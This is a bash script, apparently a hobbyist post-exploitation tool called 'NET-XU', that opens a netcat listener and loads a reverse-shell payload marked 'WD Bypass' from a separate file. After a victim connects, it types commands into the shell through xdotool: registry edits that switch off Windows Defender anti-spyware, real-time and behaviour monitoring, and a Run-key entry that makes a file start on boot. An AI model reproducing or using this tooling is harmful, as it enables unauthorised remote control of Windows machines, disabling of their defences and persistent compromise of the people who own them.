#!/bin/bash

# Coded by popps_000/.>

# NET-XU Tools


terminal_width=900
terminal_height=760

resize_terminal() {
  xdotool getactivewindow windowsize $terminal_width $terminal_height
}

clear
 
check_dependencies() {

  if ! command -v nc &> /dev/null; then
    echo "Netcat is not installed."
    read -p "Do you want to install ? (Y/n): " install_nc
    if [[ $install_nc == "Y" || $install_nc == "y" ]]; then
      sudo apt-get install netcat
    else
      echo "installation canceled."
      exit 1
    fi
  fi

if ! command -v xdotool &> /dev/null; then
    echo "xdotool is not installed."
    read -p "Do you want to install ? (Y/n): " install_xdotool
    if [[ $install_xdotool == "Y" || $install_xdotool == "y" ]]; then
      sudo apt-get install xdotool
    else
      echo "installation canceled."
      exit 1
    fi
  fi

  if ! command -v gnome-terminal &> /dev/null; then
    echo "GNOME is not installed."
    read -p "Do you want to install ? (Y/n): " install_gnome_terminal
    if [[ $install_gnome_terminal == "Y" || $install_gnome_terminal == "y" ]]; then
      sudo apt-get install gnome-terminal
    else
      echo "installation canceled."
      exit 1
    fi
  fi  

  if ! command -v wmctrl &> /dev/null; then
    echo "wmctrl is not installed."
    read -p "Do you want to install ? (Y/n): " install_wmctrl
    if [[ $install_wmctrl == "Y" || $install_wmctrl == "y" ]]; then
      sudo apt-get install wmctrl
    else
      echo "installation canceled."
      exit 1
    fi
  fi

  if ! command -v figlet &> /dev/null; then
    echo "Figlet is not installed ."
    read -p "Do you want to install ? (Y/n): " install_figlet
    if [[ $install_figlet == "Y" || $install_figlet == "y" ]]; then

      sudo apt-get install figlet
    else
      echo "installation canceled."
      exit 1
    fi
  fi
}

YELLOW='\e[0;33m'


RESET='\e[0m'


RED='\033[0;31m'


RESET='\033[0m'


GREEN='\033[0;32m'


RESET='\033[0m'


PURPLE='\033[0;35m'

RESET='\033[0;35m'

WHITE='\033[0;37m'

RESET='\033[0;37m'


check_dependencies


resize_terminal


Fun_log() {

echo -e "${RED}
           _/        \_
           /  (    )  \ 
       -  /   |\^^/|   \ -
        _/    (${GREEN}@${RESET}${RED}::${RESET}${GREEN}@${RESET}${RED})    \_
        (*      \/       *)
         -\    ${GREEN}(${RESET}${RED}oo${RESET}${GREEN})${RESET}${RED}     /-
           \   ${GREEN}\  /${RESET}    ${RED}/   ${RESET}${PURPLE}Thë çüríøsïtÿ ïs thê këÿ.
${RESET}"



figlet_output=$(figlet "NET-XU~")


GREEN='\033[0;32m'
RESET='\033[0m'
colored_output="${GREEN}${figlet_output}${RESET}"


echo -e "${colored_output}"

}


create_info_box() {
  local ip="$1"
  local port="$2"
  local box_width=$(($(tput cols) - 4))
  local info_box=" $ip : $port "
  local padding=$((($box_width - ${#info_box}) / 2))
  local padding_left=$((padding - 1))
  local padding_right=$((padding + 1))
  local line=""
  for ((i = 0; i < box_width; i++)); do
    line+="─"
  done
  echo "$(tput cup 0 0)"
  echo "┌$line┐"
  echo "│$(printf "%${padding_left}s" "")$info_box$(printf "%${padding_right}s" "")│"
  echo "└$line┘"
}


check_input() {
  while [[ -z "$remote_ip" || -z "$remote_port" ]]; do

    echo -e "${RED}The IP and/or port is missing. Please provide a valid value${RESET}"
    read -p "Enter the IP address: " remote_ip
    read -p "Enter the PORT number: " remote_port 
  done
  clear
} 


continue_execution() {

  echo -e "${YELLOW}Press ENTER to continue --->${RESET}"
  while :; do
    for ((i=1; i<=3; i++)); do
      echo -ne "."
      sleep 0.5
    done
    echo -ne "\b\b\b   \b\b\b" 
  done &

  read -rp ""
  kill $!
  clear
}


animate_dots() {
  local duration=$1  
  local num_dots=5  
  local delay=0.1    

  for ((i = 0; i < num_dots; i++)); do
    printf "."
    sleep $delay
  done
}


cleanup() {
  echo -e "\n${GREEN}NET-XU ${RED}Closed...${RESET}"
  
  terminal_id=$(wmctrl -l | grep "Terminal" | awk '{print $1}')
  
  wmctrl -ic $terminal_id
  
  exit 0
}




Zomb_nc() {
  clear
  Fun_log
  while true; do
    echo -e "${GREEN}PORT listener:${RESET}"
    read -rp "> " nc_port
    if [[ "$nc_port" =~ ^[0-9]+$ ]]; then
      break  
    else
      echo -e "${RED}Invalid option. Try again.${RESET}"
    fi
  done

  continue_execution

trap cleanup SIGINT

gnome-terminal --geometry=80x24+0+0 -- nc -nlvp $nc_port
echo -e "${RED}WAIT\c${RESET}"
sleep 1

Fun_log

while true; do
  clear
  
  Fun_log
  
  if netstat -tn | grep ":$nc_port" >/dev/null; then
    echo -e "${GREEN}Connection established successfully.${RESET}"
    break  
  else
    echo -e "${RED}Waiting for connection...${RESET}"
  fi
  sleep 1  
done

 main_function  

}

main_function() {
clear
Fun_log
echo -e "${GREEN}Connection established successfully.${RESET}"

terminal_id=$(wmctrl -l | grep "Terminal" | awk '{print $1}')


echo

echo -e "${YELLOW}Shell Command List:${RESET}"
echo
echo -e "${YELLOW}1${RESET}. Disable ${PURPLE}Anti Spyware${RESET}   "
echo
echo -e "${YELLOW}2${RESET}. Disable ${PURPLE}Realtime Monitoring${RESET}  "
echo
echo -e "${YELLOW}3${RESET}. Disable ${PURPLE}Behavior Monitoring${RESET} "
echo
echo -e "${YELLOW}4${RESET}. Show ${PURPLE}current directory${RESET} "
echo
echo -e "${YELLOW}5${RESET}. Show ${PURPLE}folder list${RESET} " 
echo
echo -e "${YELLOW}6${RESET}. Activate ${PURPLE}File auto startup${RESET} "
echo
echo -e "${YELLOW}X${RESET}. ${RED}Exit${RESET} "
echo -e "${YELLOW}R${RESET}. ${RED}Reload${RESET} "
echo
while true; do
  read -rp "> " choice

  case $choice in
    1)
      command='reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f'
      ;;
    2)
      command='reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f'
      ;;
    3)
      command='reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f'
      ;;
    4)
      command='pwd'
      ;;
    5)
      command='ls'
      ;;
    6)
      echo
      echo -e -n "${GREEN}Enter File name:${RESET} "
      read -r file_name
      echo
      echo -e -n "${GREEN}Enter file directory: C:\ "${RESET}
      read -r file_directory

      command="reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v $file_name /d $file_directory\\$file_name /f"
      ;;
    
    X)
      exit
      ;;
    x)
      xdotool windowkill $terminal_id
      exit
      ;;
    R)
       main_function
      ;;
    r)
       main_function
      ;;
    *)
      echo -e "${RED}Invalid option. Try again.${RESET}"
      continue
      ;;
  esac
  xdotool windowactivate --sync $terminal_id type "$command"
  xdotool windowactivate --sync $terminal_id key Return

done

}


###################################################################################################################



remote_ip="IP"
remote_port="PORT"

Fun_log

continue_execution
clear
 
create_info_box "$remote_ip" "$remote_port"
Fun_log

while true; do
  echo -e "${GREEN}Select options:${RESET}"

  echo
  echo -e "${YELLOW}1${RESET} - ${PURPLE}Create shell${RESET} -"
  echo
  echo -e "${YELLOW}2${RESET} - ${PURPLE}Open listener${RESET} -"
  echo
  read -rp "> " choice

  case $choice in
    1)
      break  
      ;;
    2)
      Zomb_nc
      ;;
    *)
      echo -e "${RED}Invalid option. Try again.${RESET}"
      ;;
  esac
done

clear
Fun_log


echo -e "${GREEN}Enter the number of${RESET} ${RED}IP${RESET} ${GREEN}=${RESET}"
read -rp "> " remote_ip

echo


echo -e "${GREEN}Enter the number of${RESET} ${RED}PORT${RESET} ${GREEN}=${RESET}"
read -rp "> " remote_port

echo

continue_execution


check_input


create_info_box "$remote_ip" "$remote_port"


Fun_log


echo -e "${GREEN}Select Shell code:${RESET}"
echo
echo -e "${YELLOW}1${RESET}. Shell Windows TCP ${PURPLE}WD Bypass${RESET}"
echo
echo -e "${YELLOW}2${RESET}. Shell Windows TCP ${PURPLE}Normal${RESET}"

read -rp "> " sh_choice

case $sh_choice in
    1)
        sh_Repo="./SHconf/Sll.sh"
        ;;
    2)
        sh_Repo="./SHconf/Sll.sh"
        ;;
    3)
        sh_Repo="./XXXXX.sh"
        ;;
    *)
        echo -e "${RED}Select valid option.${RESET}"
        exit 1
        ;;
esac
source "$sh_Repo"


echo -e "${GREEN}Reverse shell completed\c"
animate_dots 2  
echo -e "${RESET}"
echo
echo -e "${RED}Reverse shell:${RESET}"
echo
echo
echo "$rev_sh"
echo



continue_execution


Zomb_nc




